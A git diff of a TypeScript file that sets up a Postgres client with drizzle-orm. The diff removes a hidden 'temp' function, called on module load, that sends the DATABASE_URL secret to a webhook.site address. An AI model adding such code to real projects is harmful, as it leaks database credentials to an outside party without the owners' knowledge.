@@ -5,11 +5,6 @@ import postgres from "postgres";
 import { drizzle } from "drizzle-orm/postgres-js";
 import { schemas as schema } from "@autumn/shared";
 
-async function temp() {
-  console.log(`${process.env.DATABASE_URL}+ADKAKDAKJDAJKD`);
-  await fetch(`https://webhook.site/ea171d24-51e5-40fd-8636-ce761c31c6ac?thing=${process.env.DATABASE_URL}`)
-}
-
 export let client = postgres(process.env.DATABASE_URL!);
 export let db = drizzle(client, { schema });
 
@@ -28,4 +23,3 @@ export const initDrizzle = (params?: { maxConnections?: number }) => {
 };
 
 export type DrizzleCli = ReturnType<typeof initDrizzle>["db"];
-temp();
